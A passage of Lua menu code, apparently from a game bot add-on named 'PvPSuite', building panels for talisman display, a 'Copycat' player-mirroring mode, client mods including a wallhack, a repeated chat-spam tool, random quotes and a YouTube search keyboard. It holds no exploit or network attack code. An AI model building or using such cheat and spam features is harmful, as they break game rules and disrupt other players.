				html:AddHtml("</br ><table bgcolor=303030 width=236 cellspacing=4><tr><td align=left valign=top width=290>Talisman(4) </ br><font color=FF8040>" ..GetItemName(Item).. "</font></td><td height=45 width=36><img src="..GetItemIcon(Item).." height=32 width=32></td></tr></table>");
			end; 
			Item = GetTarget():GetEquip_Talizman5Id();
			if ((Item ~= 0) and (Item ~= nil)) then
				html:AddHtml("</br ><table bgcolor=303030 width=236 cellspacing=4><tr><td align=left valign=top width=290>Talisman(5) </ br><font color=FF8040>" ..GetItemName(Item).. "</font></td><td height=45 width=36><img src="..GetItemIcon(Item).." height=32 width=32></td></tr></table>");
			end; 
			Item = GetTarget():GetEquip_Talizman6Id();
			if ((Item ~= 0) and (Item ~= nil)) then
				html:AddHtml("</br ><table bgcolor=303030 width=236 cellspacing=4><tr><td align=left valign=top width=290>Talisman(6) </ br><font color=FF8040>" ..GetItemName(Item).. "</font></td><td height=45 width=36><img src="..GetItemIcon(Item).." height=32 width=32></td></tr></table>");
			end; 
	elseif (action == "Copycat") then
			html:AddHtml("</br ></br >");
			local Condition = false;
			if ((Copycat)) then
				Condition = true;
			end;
			html:AddHtml("<table bgcolor=303030 cellspacing=4 cellpadding=2 width=267><tr><td align=center valign=top width=236>");
			html:AddButton(THtmlAction("/doaction"):AddParam("CopycatED"),THtmlButtonStyle.BUTTON_EXTRA, "Copycat",Condition,"","",170,25);
			html:AddHtml("</td></tr></table>");
			if (PvPSuite[17]) then
				html:AddHtml("<table bgcolor=303030 cellspacing=4 cellpadding=2 width=267><tr><td align=center valign=top width=236>");
				html:AddHtml("Enable/Disable Copycat!");
				html:AddHtml("</td></tr></table>");
			end;
			html:AddHtml("</br ></br >");
			html:AddHtml("<table bgcolor=303030 cellspacing=4 cellpadding=2 width=267><tr><td align=center valign=top width=236>");
			html:AddButton(THtmlAction("/doaction"):AddParam("Copy Target"),THtmlButtonStyle.BUTTON_ACTION, "Copy Target",false,"","",170,25);
			html:AddHtml("</td></tr></table>");
			if (PvPSuite[17]) then
				html:AddHtml("<table bgcolor=303030 cellspacing=4 cellpadding=2 width=267><tr><td align=center valign=top width=236>");
				html:AddHtml("Target the player you want to copycat!");
				html:AddHtml("</td></tr></table>");
			end;
			if (CopycatName ~= "") then
				html:AddHtml('</br><font color="FF0000">Player: '..CopycatName..'</font>');
				html:AddHtml("</br ></br >");
				html:AddHtml("<table bgcolor=303030 cellspacing=4 cellpadding=2 width=267><tr><td align=center valign=top width=236>");
				html:AddButton(THtmlAction("/doaction"):AddParam("Clear Player"),THtmlButtonStyle.BUTTON_ACTION, "Clear Player",false,"","",170,25);
				html:AddHtml("</td></tr></table>");
				if (PvPSuite[17]) then
					html:AddHtml("<table bgcolor=303030 cellspacing=4 cellpadding=2 width=267><tr><td align=center valign=top width=236>");
					html:AddHtml("Click this button to clear the player you copy!");
					html:AddHtml("</td></tr></table>");
				end;
			end;
	elseif (action == "Client Mods") then	
			local Style = THtmlButtonStyle.BUTTON_NO_CLICK;
			Condition = false;
			if (IsPremium()) then
				Style = THtmlButtonStyle.BUTTON_TAB;
			end;
			html:AddButton(THtmlAction("/doaction"):AddParam("Ultimate Zoom"),Style, "Ultimate Zoom",Condition,"","",120,17);
			if (PvPSuite[17]) then
				html:AddHtml('</br >Get ultimate min and max zoom.</br >');
			end;
			html:AddHtml("</br ></br >");
			html:AddButton(THtmlAction("/doaction"):AddParam("Boost Video"),Style, "Boost Video",Condition,"","",120,17);
			if (PvPSuite[17]) then
				html:AddHtml('</br >Reduce game video lag!</br >');
			end;
			html:AddHtml("</br ></br >");
			html:AddButton(THtmlAction("/doaction"):AddParam("SHWallhack"),Style, "Wallhack",Condition,"","",120,17);
			if (PvPSuite[17]) then
				html:AddHtml('</br >Enable/Disable wallhack.</br >');
			end;
			html:AddHtml("</br ></br >");
			html:AddButton(THtmlAction("/doaction"):AddParam("SHRadii"),Style, "Radii",Condition,"","",120,17);
			if (PvPSuite[17]) then
				html:AddHtml('</br >Show/Hide Radii.</br >');
			end;
			html:AddHtml("</br ></br >");
			html:AddButton(THtmlAction("/doaction"):AddParam("SHFog"),Style, "Fog",Condition,"","",120,17);
			if (PvPSuite[17]) then
				html:AddHtml('</br >Show/Hide Fog.</br >');
			end;
			html:AddHtml("</br ></br >");
			html:AddButton(THtmlAction("/doaction"):AddParam("SHStaticmeshes"),Style, "Staticmeshes",Condition,"","",120,17);
			if (PvPSuite[17]) then
				html:AddHtml('</br >Show/Hide Staticmeshes.</br >');
			end;
			html:AddHtml("</br ></br >");
			html:AddButton(THtmlAction("/doaction"):AddParam("SHTerrain"),Style, "Terrain",Condition,"","",120,17);
			if (PvPSuite[17]) then
				html:AddHtml('</br >Show/Hide Terrain.</br >');
			end;
			html:AddHtml("</br ></br >");
			html:AddButton(THtmlAction("/doaction"):AddParam("SHFps"),Style, "FPS",Condition,"","",120,17);
			if (PvPSuite[17]) then
				html:AddHtml('</br >Show/Hide FPS.</br >');
			end;
			html:AddHtml("</br ></br >");
			html:AddButton(THtmlAction("/doaction"):AddParam("SHNet"),Style, "Net Stats",Condition,"","",120,17);
			if (PvPSuite[17]) then
				html:AddHtml('</br >Show/Hide Net Stats.</br >');
			end;
	elseif (action == "Title Effects") then
			html:AddHtml("<table bgcolor=303030 cellspacing=4 cellpadding=2 width=267><tr><td align=center valign=top width=236>");
			html:AddButton(THtmlAction("/doaction"):AddParam("Flashing Title(Slow)"),THtmlButtonStyle.BUTTON_ACTION, "Flashing Title(Slow)",false,"","",140,25);
			html:AddHtml("</td></tr></table>");
			if (PvPSuite[17]) then
				html:AddHtml("<table bgcolor=303030 cellspacing=4 cellpadding=2 width=267><tr><td align=center valign=top width=236>");
				html:AddHtml('Makes your title flash with slow speed!');
				html:AddHtml("</td></tr></table>");
			end;
			html:AddHtml("</br ></br >");
			html:AddHtml("<table bgcolor=303030 cellspacing=4 cellpadding=2 width=267><tr><td align=center valign=top width=236>");
			html:AddButton(THtmlAction("/doaction"):AddParam("Flashing Title(Fast)"),THtmlButtonStyle.BUTTON_ACTION, "Flashing Title(Fast)",false,"","",140,25);
			html:AddHtml("</td></tr></table>");
			if (PvPSuite[17]) then
				html:AddHtml("<table bgcolor=303030 cellspacing=4 cellpadding=2 width=267><tr><td align=center valign=top width=236>");
				html:AddHtml('Makes your title flash with fast speed!');
				html:AddHtml("</td></tr></table>");
			end;
			html:AddHtml("</br ></br >");
			html:AddHtml("<table bgcolor=303030 cellspacing=4 cellpadding=2 width=267><tr><td align=center valign=top width=236>");
			html:AddButton(THtmlAction("/doaction"):AddParam("Moving Title"),THtmlButtonStyle.BUTTON_ACTION, "Moving Title",false,"","",140,25);
			html:AddHtml("</td></tr></table>");
			if (PvPSuite[17]) then
				html:AddHtml("<table bgcolor=303030 cellspacing=4 cellpadding=2 width=267><tr><td align=center valign=top width=236>");
				html:AddHtml('Makes your title move!');
				html:AddHtml("</td></tr></table>");
			end;
	elseif (action == "Contact Info") then	
			html:AddHtml('You can contact me via</br >');
			html:AddHtml("<table bgcolor=303030 cellspacing=4 cellpadding=2 width=120><tr><td align=center valign=center width=236>");
			html:AddHtml('<font color="12A5F4">Skype:</font>');
			html:AddHtml("</td><td align=center valign=top width=236>");
			html:AddButton(THtmlAction("/doaction"):AddParam("AddSkype"),THtmlButtonStyle.BUTTON_ACTION, "PvPSuite",false,"","",150,30);
			html:AddHtml("</td></tr></table>");
			html:AddHtml("<table bgcolor=303030 cellspacing=4 cellpadding=2 width=120><tr><td align=center valign=center width=236>");
			html:AddHtml('<font color="777777">Email:</font>');
			html:AddHtml("</td><td align=center valign=top width=236>");
			html:AddButton(THtmlAction("/doaction"):AddParam("SendEmail"),THtmlButtonStyle.BUTTON_ACTION, "pvpsuite@gmail.com",false,"","",150,30);
			html:AddHtml("</td></tr></table></br >");
			html:AddHtml('Feel free to contact me and:</br >');
			html:AddHtml('<font color="CC0033">Report any kind of bugs</font></br >');
			html:AddHtml('<font color="CC0033">Give me your suggestions</font></br >');
			html:AddHtml('<font color="CC0033">Share your thoughts</font></br >');
	elseif (action == "Spam Chat(No CB)") then		
			html:AddHtml("<table bgcolor=303030 cellspacing=4 cellpadding=2 width=270><tr><td align=center valign=center width=236 height=20>");
			html:AddHtml(SpamQuery);
			html:AddHtml('</td></tr></table></ br></ br>');
			html:Table_Start(true, false, 280);
			html:Table_AddColumns(12);
			html:AddButton(THtmlAction("/spamq"):AddParam("1"),THtmlButtonStyle.BUTTON_ACTION,"1",false,"","",22,25);
			html:AddButton(THtmlAction("/spamq"):AddParam("2"),THtmlButtonStyle.BUTTON_ACTION,"2",false,"","",22,25);
			html:AddButton(THtmlAction("/spamq"):AddParam("3"),THtmlButtonStyle.BUTTON_ACTION,"3",false,"","",22,25);
			html:AddButton(THtmlAction("/spamq"):AddParam("4"),THtmlButtonStyle.BUTTON_ACTION,"4",false,"","",22,25);
			html:AddButton(THtmlAction("/spamq"):AddParam("5"),THtmlButtonStyle.BUTTON_ACTION,"5",false,"","",22,25);
			html:AddButton(THtmlAction("/spamq"):AddParam("6"),THtmlButtonStyle.BUTTON_ACTION,"6",false,"","",22,25);
			html:AddButton(THtmlAction("/spamq"):AddParam("7"),THtmlButtonStyle.BUTTON_ACTION,"7",false,"","",22,25);
			html:AddButton(THtmlAction("/spamq"):AddParam("8"),THtmlButtonStyle.BUTTON_ACTION,"8",false,"","",22,25);
			html:AddButton(THtmlAction("/spamq"):AddParam("9"),THtmlButtonStyle.BUTTON_ACTION,"9",false,"","",22,25);
			html:AddButton(THtmlAction("/spamq"):AddParam("0"),THtmlButtonStyle.BUTTON_ACTION,"0",false,"","",22,25);
			html:AddButton(THtmlAction("/spamq"):AddParam("-"),THtmlButtonStyle.BUTTON_ACTION,"-",false,"","",22,25);
			html:AddButton(THtmlAction("/spamq"):AddParam("Backspace"),THtmlButtonStyle.BUTTON_ACTION,"<",false,"","",55,25);
			html:Table_End();
			if (caps2) then
				html:Table_Start(true, false, 270);
				html:Table_AddColumns(10);
				html:AddButton(THtmlAction("/spamq"):AddParam("Q"),THtmlButtonStyle.BUTTON_ACTION,"Q",false,"","",33,25);
				html:AddButton(THtmlAction("/spamq"):AddParam("W"),THtmlButtonStyle.BUTTON_ACTION,"W",false,"","",33,25);
				html:AddButton(THtmlAction("/spamq"):AddParam("E"),THtmlButtonStyle.BUTTON_ACTION,"E",false,"","",33,25);
				html:AddButton(THtmlAction("/spamq"):AddParam("R"),THtmlButtonStyle.BUTTON_ACTION,"R",false,"","",33,25);
				html:AddButton(THtmlAction("/spamq"):AddParam("T"),THtmlButtonStyle.BUTTON_ACTION,"T",false,"","",33,25);
				html:AddButton(THtmlAction("/spamq"):AddParam("Y"),THtmlButtonStyle.BUTTON_ACTION,"Y",false,"","",33,25);
				html:AddButton(THtmlAction("/spamq"):AddParam("U"),THtmlButtonStyle.BUTTON_ACTION,"U",false,"","",33,25);
				html:AddButton(THtmlAction("/spamq"):AddParam("I"),THtmlButtonStyle.BUTTON_ACTION,"I",false,"","",33,25);
				html:AddButton(THtmlAction("/spamq"):AddParam("O"),THtmlButtonStyle.BUTTON_ACTION,"O",false,"","",33,25);
				html:AddButton(THtmlAction("/spamq"):AddParam("P"),THtmlButtonStyle.BUTTON_ACTION,"P",false,"","",33,25);
				html:Table_End();
				html:Table_Start(true, false, 255);
				html:Table_AddColumns(9);
				html:AddButton(THtmlAction("/spamq"):AddParam("A"),THtmlButtonStyle.BUTTON_ACTION,"A",false,"","",33,25);
				html:AddButton(THtmlAction("/spamq"):AddParam("S"),THtmlButtonStyle.BUTTON_ACTION,"S",false,"","",33,25);
				html:AddButton(THtmlAction("/spamq"):AddParam("D"),THtmlButtonStyle.BUTTON_ACTION,"D",false,"","",33,25);
				html:AddButton(THtmlAction("/spamq"):AddParam("F"),THtmlButtonStyle.BUTTON_ACTION,"F",false,"","",33,25);
				html:AddButton(THtmlAction("/spamq"):AddParam("G"),THtmlButtonStyle.BUTTON_ACTION,"G",false,"","",33,25);
				html:AddButton(THtmlAction("/spamq"):AddParam("H"),THtmlButtonStyle.BUTTON_ACTION,"H",false,"","",33,25);
				html:AddButton(THtmlAction("/spamq"):AddParam("J"),THtmlButtonStyle.BUTTON_ACTION,"J",false,"","",33,25);
				html:AddButton(THtmlAction("/spamq"):AddParam("K"),THtmlButtonStyle.BUTTON_ACTION,"K",false,"","",33,25);
				html:AddButton(THtmlAction("/spamq"):AddParam("L"),THtmlButtonStyle.BUTTON_ACTION,"L",false,"","",33,25);
				html:Table_End();
				html:Table_Start(true, false, 240);
				html:Table_AddColumns(7);
				html:AddButton(THtmlAction("/spamq"):AddParam("Z"),THtmlButtonStyle.BUTTON_ACTION,"Z",false,"","",33,25);
				html:AddButton(THtmlAction("/spamq"):AddParam("X"),THtmlButtonStyle.BUTTON_ACTION,"X",false,"","",33,25);
				html:AddButton(THtmlAction("/spamq"):AddParam("C"),THtmlButtonStyle.BUTTON_ACTION,"C",false,"","",33,25);
				html:AddButton(THtmlAction("/spamq"):AddParam("V"),THtmlButtonStyle.BUTTON_ACTION,"V",false,"","",33,25);
				html:AddButton(THtmlAction("/spamq"):AddParam("B"),THtmlButtonStyle.BUTTON_ACTION,"B",false,"","",33,25);
				html:AddButton(THtmlAction("/spamq"):AddParam("N"),THtmlButtonStyle.BUTTON_ACTION,"N",false,"","",33,25);
				html:AddButton(THtmlAction("/spamq"):AddParam("M"),THtmlButtonStyle.BUTTON_ACTION,"M",false,"","",33,25);
				html:Table_End();
			else
				html:Table_Start(true, false, 270);
				html:Table_AddColumns(10);
				html:AddButton(THtmlAction("/spamq"):AddParam("q"),THtmlButtonStyle.BUTTON_ACTION,"q",false,"","",33,25);
				html:AddButton(THtmlAction("/spamq"):AddParam("w"),THtmlButtonStyle.BUTTON_ACTION,"w",false,"","",33,25);
				html:AddButton(THtmlAction("/spamq"):AddParam("e"),THtmlButtonStyle.BUTTON_ACTION,"e",false,"","",33,25);
				html:AddButton(THtmlAction("/spamq"):AddParam("r"),THtmlButtonStyle.BUTTON_ACTION,"r",false,"","",33,25);
				html:AddButton(THtmlAction("/spamq"):AddParam("t"),THtmlButtonStyle.BUTTON_ACTION,"t",false,"","",33,25);
				html:AddButton(THtmlAction("/spamq"):AddParam("y"),THtmlButtonStyle.BUTTON_ACTION,"y",false,"","",33,25);
				html:AddButton(THtmlAction("/spamq"):AddParam("u"),THtmlButtonStyle.BUTTON_ACTION,"u",false,"","",33,25);
				html:AddButton(THtmlAction("/spamq"):AddParam("i"),THtmlButtonStyle.BUTTON_ACTION,"i",false,"","",33,25);
				html:AddButton(THtmlAction("/spamq"):AddParam("o"),THtmlButtonStyle.BUTTON_ACTION,"o",false,"","",33,25);
				html:AddButton(THtmlAction("/spamq"):AddParam("p"),THtmlButtonStyle.BUTTON_ACTION,"p",false,"","",33,25);
				html:Table_End();
				html:Table_Start(true, false, 255);
				html:Table_AddColumns(9);
				html:AddButton(THtmlAction("/spamq"):AddParam("a"),THtmlButtonStyle.BUTTON_ACTION,"a",false,"","",33,25);
				html:AddButton(THtmlAction("/spamq"):AddParam("s"),THtmlButtonStyle.BUTTON_ACTION,"s",false,"","",33,25);
				html:AddButton(THtmlAction("/spamq"):AddParam("d"),THtmlButtonStyle.BUTTON_ACTION,"d",false,"","",33,25);
				html:AddButton(THtmlAction("/spamq"):AddParam("f"),THtmlButtonStyle.BUTTON_ACTION,"f",false,"","",33,25);
				html:AddButton(THtmlAction("/spamq"):AddParam("g"),THtmlButtonStyle.BUTTON_ACTION,"g",false,"","",33,25);
				html:AddButton(THtmlAction("/spamq"):AddParam("h"),THtmlButtonStyle.BUTTON_ACTION,"h",false,"","",33,25);
				html:AddButton(THtmlAction("/spamq"):AddParam("j"),THtmlButtonStyle.BUTTON_ACTION,"j",false,"","",33,25);
				html:AddButton(THtmlAction("/spamq"):AddParam("k"),THtmlButtonStyle.BUTTON_ACTION,"k",false,"","",33,25);
				html:AddButton(THtmlAction("/spamq"):AddParam("l"),THtmlButtonStyle.BUTTON_ACTION,"l",false,"","",33,25);
				html:Table_End();
				html:Table_Start(true, false, 240);
				html:Table_AddColumns(7);
				html:AddButton(THtmlAction("/spamq"):AddParam("z"),THtmlButtonStyle.BUTTON_ACTION,"z",false,"","",33,25);
				html:AddButton(THtmlAction("/spamq"):AddParam("x"),THtmlButtonStyle.BUTTON_ACTION,"x",false,"","",33,25);
				html:AddButton(THtmlAction("/spamq"):AddParam("c"),THtmlButtonStyle.BUTTON_ACTION,"c",false,"","",33,25);
				html:AddButton(THtmlAction("/spamq"):AddParam("v"),THtmlButtonStyle.BUTTON_ACTION,"v",false,"","",33,25);
				html:AddButton(THtmlAction("/spamq"):AddParam("b"),THtmlButtonStyle.BUTTON_ACTION,"b",false,"","",33,25);
				html:AddButton(THtmlAction("/spamq"):AddParam("n"),THtmlButtonStyle.BUTTON_ACTION,"n",false,"","",33,25);
				html:AddButton(THtmlAction("/spamq"):AddParam("m"),THtmlButtonStyle.BUTTON_ACTION,"m",false,"","",33,25);
				html:Table_End();
			end;
			html:AddHtml('</ br>');
			local Condition = false;
			if (caps2) then
				Condition = true;
			end;
			html:AddHtml("<table cellspacing=4 cellpadding=2 width=270><tr><td>");
			html:AddButton(THtmlAction("/spamq"):AddParam("Caps Lock"),THtmlButtonStyle.BUTTON_ON_OFF, "Caps Lock",Condition,"","",70,25);
			html:AddHtml('</td><td>');
			html:AddButton(THtmlAction("/spamq"):AddParam("Spacebar"),THtmlButtonStyle.BUTTON_ACTION, "Spacebar",false,"","",115,25);
			html:AddHtml('</td><td>');
			html:AddButton(THtmlAction("/spamq"):AddParam("Clear"),THtmlButtonStyle.BUTTON_ACTION, "Clear",false,"","",55,25);
			html:AddHtml('</td></tr></table>');
			html:AddHtml('</ br>');
			html:AddHtml("<table width=150><tr><td>Repeat Times:");
			html:AddHtml('</td><td>');
			html:AddEdit("num",true,30,15);
			html:AddHtml('</td></tr></table></ br>');
			html:Table_Start(true, false, 180);
			html:Table_AddColumns(3);	
			html:AddButton(THtmlAction("/spamq"):AddParam("General"):AddParam("$num",true),THtmlButtonStyle.BUTTON_ACTION, "General",false,"","",60,25);
			html:AddButton(THtmlAction("/spamq"):AddParam("Shout"):AddParam("$num",true),THtmlButtonStyle.BUTTON_ACTION, "Shout",false,"","",60,25);
			html:AddButton(THtmlAction("/spamq"):AddParam("Trade"):AddParam("$num",true),THtmlButtonStyle.BUTTON_ACTION, "Trade",false,"","",60,25);
			html:Table_End();
	elseif (action == "Random Quote") then
			html:AddHtml('<center>');
			html:Table_Start(true, false, 270);
			html:Table_AddColumns(2);	
			html:AddButton(THtmlAction("/rq"):AddParam("General"),THtmlButtonStyle.BUTTON_ACTION, "General Chat",false,"","",120,25);
			html:AddButton(THtmlAction("/rq"):AddParam("Shout"),THtmlButtonStyle.BUTTON_ACTION, "Shout Chat",false,"","",120,25);
			html:Table_End();
			html:Table_Start(true, false, 270);
			html:Table_AddColumns(2);	
			html:AddButton(THtmlAction("/rq"):AddParam("Trade"),THtmlButtonStyle.BUTTON_ACTION, "Trade Chat",false,"","",120,25);
			html:AddButton(THtmlAction("/rq"):AddParam("Party"),THtmlButtonStyle.BUTTON_ACTION, "Party Chat",false,"","",120,25);
			html:Table_End();
			html:Table_Start(true, false, 270);
			html:Table_AddColumns(2);	
			html:AddButton(THtmlAction("/rq"):AddParam("Clan"),THtmlButtonStyle.BUTTON_ACTION, "Clan Chat",false,"","",120,25);
			html:AddButton(THtmlAction("/rq"):AddParam("Ally"),THtmlButtonStyle.BUTTON_ACTION, "Ally Chat",false,"","",120,25);
			html:Table_End();
			html:AddButton(THtmlAction("/rq"):AddParam("HV"),THtmlButtonStyle.BUTTON_ACTION, "Hero Voice",false,"","",120,25);
			html:AddHtml('</center>');
	elseif (action == "YouTube") then
			html:AddHtml("<table bgcolor=303030 cellspacing=4 cellpadding=2 width=270><tr><td align=center valign=center width=236 height=20>");
			html:AddHtml(YTQuery);
			html:AddHtml('</td></tr></table></ br></ br>');
			html:Table_Start(true, false, 280);
			html:Table_AddColumns(12);
			html:AddButton(THtmlAction("/ytq"):AddParam("1"),THtmlButtonStyle.BUTTON_ACTION,"1",false,"","",22,25);
			html:AddButton(THtmlAction("/ytq"):AddParam("2"),THtmlButtonStyle.BUTTON_ACTION,"2",false,"","",22,25);
			html:AddButton(THtmlAction("/ytq"):AddParam("3"),THtmlButtonStyle.BUTTON_ACTION,"3",false,"","",22,25);
			html:AddButton(THtmlAction("/ytq"):AddParam("4"),THtmlButtonStyle.BUTTON_ACTION,"4",false,"","",22,25);
			html:AddButton(THtmlAction("/ytq"):AddParam("5"),THtmlButtonStyle.BUTTON_ACTION,"5",false,"","",22,25);
			html:AddButton(THtmlAction("/ytq"):AddParam("6"),THtmlButtonStyle.BUTTON_ACTION,"6",false,"","",22,25);
			html:AddButton(THtmlAction("/ytq"):AddParam("7"),THtmlButtonStyle.BUTTON_ACTION,"7",false,"","",22,25);
			html:AddButton(THtmlAction("/ytq"):AddParam("8"),THtmlButtonStyle.BUTTON_ACTION,"8",false,"","",22,25);
			html:AddButton(THtmlAction("/ytq"):AddParam("9"),THtmlButtonStyle.BUTTON_ACTION,"9",false,"","",22,25);
			html:AddButton(THtmlAction("/ytq"):AddParam("0"),THtmlButtonStyle.BUTTON_ACTION,"0",false,"","",22,25);
			html:AddButton(THtmlAction("/ytq"):AddParam("-"),THtmlButtonStyle.BUTTON_ACTION,"-",false,"","",22,25);
			html:AddButton(THtmlAction("/ytq"):AddParam("Backspace"),THtmlButtonStyle.BUTTON_ACTION,"<",false,"","",55,25);
			html:Table_End();
			if (caps) then
				html:Table_Start(true, false, 270);
				html:Table_AddColumns(10);
				html:AddButton(THtmlAction("/ytq"):AddParam("Q"),THtmlButtonStyle.BUTTON_ACTION,"Q",false,"","",33,25);
				html:AddButton(THtmlAction("/ytq"):AddParam("W"),THtmlButtonStyle.BUTTON_ACTION,"W",false,"","",33,25);
				html:AddButton(THtmlAction("/ytq"):AddParam("E"),THtmlButtonStyle.BUTTON_ACTION,"E",false,"","",33,25);
				html:AddButton(THtmlAction("/ytq"):AddParam("R"),THtmlButtonStyle.BUTTON_ACTION,"R",false,"","",33,25);
				html:AddButton(THtmlAction("/ytq"):AddParam("T"),THtmlButtonStyle.BUTTON_ACTION,"T",false,"","",33,25);
				html:AddButton(THtmlAction("/ytq"):AddParam("Y"),THtmlButtonStyle.BUTTON_ACTION,"Y",false,"","",33,25);
				html:AddButton(THtmlAction("/ytq"):AddParam("U"),THtmlButtonStyle.BUTTON_ACTION,"U",false,"","",33,25);
				html:AddButton(THtmlAction("/ytq"):AddParam("I"),THtmlButtonStyle.BUTTON_ACTION,"I",false,"","",33,25);
				html:AddButton(THtmlAction("/ytq"):AddParam("O"),THtmlButtonStyle.BUTTON_ACTION,"O",false,"","",33,25);
				html:AddButton(THtmlAction("/ytq"):AddParam("P"),THtmlButtonStyle.BUTTON_ACTION,"P",false,"","",33,25);
				html:Table_End();
				html:Table_Start(true, false, 255);
				html:Table_AddColumns(9);
				html:AddButton(THtmlAction("/ytq"):AddParam("A"),THtmlButtonStyle.BUTTON_ACTION,"A",false,"","",33,25);
				html:AddButton(THtmlAction("/ytq"):AddParam("S"),THtmlButtonStyle.BUTTON_ACTION,"S",false,"","",33,25);
				html:AddButton(THtmlAction("/ytq"):AddParam("D"),THtmlButtonStyle.BUTTON_ACTION,"D",false,"","",33,25);
				html:AddButton(THtmlAction("/ytq"):AddParam("F"),THtmlButtonStyle.BUTTON_ACTION,"F",false,"","",33,25);
				html:AddButton(THtmlAction("/ytq"):AddParam("G"),THtmlButtonStyle.BUTTON_ACTION,"G",false,"","",33,25);
				html:AddButton(THtmlAction("/ytq"):AddParam("H"),THtmlButtonStyle.BUTTON_ACTION,"H",false,"","",33,25);
				html:AddButton(THtmlAction("/ytq"):AddParam("J"),THtmlButtonStyle.BUTTON_ACTION,"J",false,"","",33,25);
				html:AddButton(THtmlAction("/ytq"):AddParam("K"),THtmlButtonStyle.BUTTON_ACTION,"K",false,"","",33,25);
				html:AddButton(THtmlAction("/ytq"):AddParam("L"),THtmlButtonStyle.BUTTON_ACTION,"L",false,"","",33,25);
				html:Table_End();
				html:Table_Start(true, false, 240);
				html:Table_AddColumns(7);
				html:AddButton(THtmlAction("/ytq"):AddParam("Z"),THtmlButtonStyle.BUTTON_ACTION,"Z",false,"","",33,25);
				html:AddButton(THtmlAction("/ytq"):AddParam("X"),THtmlButtonStyle.BUTTON_ACTION,"X",false,"","",33,25);
				html:AddButton(THtmlAction("/ytq"):AddParam("C"),THtmlButtonStyle.BUTTON_ACTION,"C",false,"","",33,25);
				html:AddButton(THtmlAction("/ytq"):AddParam("V"),THtmlButtonStyle.BUTTON_ACTION,"V",false,"","",33,25);
				html:AddButton(THtmlAction("/ytq"):AddParam("B"),THtmlButtonStyle.BUTTON_ACTION,"B",false,"","",33,25);
				html:AddButton(THtmlAction("/ytq"):AddParam("N"),THtmlButtonStyle.BUTTON_ACTION,"N",false,"","",33,25);
				html:AddButton(THtmlAction("/ytq"):AddParam("M"),THtmlButtonStyle.BUTTON_ACTION,"M",false,"","",33,25);
				html:Table_End();
			else
				html:Table_Start(true, false, 270);
				html:Table_AddColumns(10);
				html:AddButton(THtmlAction("/ytq"):AddParam("q"),THtmlButtonStyle.BUTTON_ACTION,"q",false,"","",33,25);
				html:AddButton(THtmlAction("/ytq"):AddParam("w"),THtmlButtonStyle.BUTTON_ACTION,"w",false,"","",33,25);
				html:AddButton(THtmlAction("/ytq"):AddParam("e"),THtmlButtonStyle.BUTTON_ACTION,"e",false,"","",33,25);
				html:AddButton(THtmlAction("/ytq"):AddParam("r"),THtmlButtonStyle.BUTTON_ACTION,"r",false,"","",33,25);
				html:AddButton(THtmlAction("/ytq"):AddParam("t"),THtmlButtonStyle.BUTTON_ACTION,"t",false,"","",33,25);
				html:AddButton(THtmlAction("/ytq"):AddParam("y"),THtmlButtonStyle.BUTTON_ACTION,"y",false,"","",33,25);
				html:AddButton(THtmlAction("/ytq"):AddParam("u"),THtmlButtonStyle.BUTTON_ACTION,"u",false,"","",33,25);
				html:AddButton(THtmlAction("/ytq"):AddParam("i"),THtmlButtonStyle.BUTTON_ACTION,"i",false,"","",33,25);
				html:AddButton(THtmlAction("/ytq"):AddParam("o"),THtmlButtonStyle.BUTTON_ACTION,"o",false,"","",33,25);
				html:AddButton(THtmlAction("/ytq"):AddParam("p"),THtmlButtonStyle.BUTTON_ACTION,"p",false,"","",33,25);
				html:Table_End();
				html:Table_Start(true, false, 255);
				html:Table_AddColumns(9);
				html:AddButton(THtmlAction("/ytq"):AddParam("a"),THtmlButtonStyle.BUTTON_ACTION,"a",false,"","",33,25);
				html:AddButton(THtmlAction("/ytq"):AddParam("s"),THtmlButtonStyle.BUTTON_ACTION,"s",false,"","",33,25);
				html:AddButton(THtmlAction("/ytq"):AddParam("d"),THtmlButtonStyle.BUTTON_ACTION,"d",false,"","",33,25);
				html:AddButton(THtmlAction("/ytq"):AddParam("f"),THtmlButtonStyle.BUTTON_ACTION,"f",false,"","",33,25);
				html:AddButton(THtmlAction("/ytq"):AddParam("g"),THtmlButtonStyle.BUTTON_ACTION,"g",false,"","",33,25);
				html:AddButton(THtmlAction("/ytq"):AddParam("h"),THtmlButtonStyle.BUTTON_ACTION,"h",false,"","",33,25);
				html:AddButton(THtmlAction("/ytq"):AddParam("j"),THtmlButtonStyle.BUTTON_ACTION,"j",false,"","",33,25);
				html:AddButton(THtmlAction("/ytq"):AddParam("k"),THtmlButtonStyle.BUTTON_ACTION,"k",false,"","",33,25);
				html:AddButton(THtmlAction("/ytq"):AddParam("l"),THtmlButtonStyle.BUTTON_ACTION,"l",false,"","",33,25);
				html:Table_End();
				html:Table_Start(true, false, 240);
				html:Table_AddColumns(7);
				html:AddButton(THtmlAction("/ytq"):AddParam("z"),THtmlButtonStyle.BUTTON_ACTION,"z",false,"","",33,25);
				html:AddButton(THtmlAction("/ytq"):AddParam("x"),THtmlButtonStyle.BUTTON_ACTION,"x",false,"","",33,25);
				html:AddButton(THtmlAction("/ytq"):AddParam("c"),THtmlButtonStyle.BUTTON_ACTION,"c",false,"","",33,25);
				html:AddButton(THtmlAction("/ytq"):AddParam("v"),THtmlButtonStyle.BUTTON_ACTION,"v",false,"","",33,25);
				html:AddButton(THtmlAction("/ytq"):AddParam("b"),THtmlButtonStyle.BUTTON_ACTION,"b",false,"","",33,25);
				html:AddButton(THtmlAction("/ytq"):AddParam("n"),THtmlButtonStyle.BUTTON_ACTION,"n",false,"","",33,25);
				html:AddButton(THtmlAction("/ytq"):AddParam("m"),THtmlButtonStyle.BUTTON_ACTION,"m",false,"","",33,25);
				html:Table_End();
			end;
			html:AddHtml('</ br>');
			local Condition = false;
			if (caps) then
				Condition = true;
			end;
			html:AddHtml("<table cellspacing=4 cellpadding=2 width=270><tr><td>");
			html:AddButton(THtmlAction("/ytq"):AddParam("Caps Lock"),THtmlButtonStyle.BUTTON_ON_OFF, "Caps Lock",Condition,"","",70,25);
			html:AddHtml('</td><td>');
			html:AddButton(THtmlAction("/ytq"):AddParam("Spacebar"),THtmlButtonStyle.BUTTON_ACTION, "Spacebar",false,"","",115,25);
			html:AddHtml('</td><td>');
			html:AddButton(THtmlAction("/ytq"):AddParam("Clear"),THtmlButtonStyle.BUTTON_ACTION, "Clear",false,"","",55,25);
			html:AddHtml('</td></tr></table>');
			html:AddHtml('</ br>');
			html:Table_Start(true, false, 120);
			html:Table_AddColumns(2);
			html:AddButton(THtmlAction("/ytp"),THtmlButtonStyle.BUTTON_ACTION, "Play",false,"","",60,25);
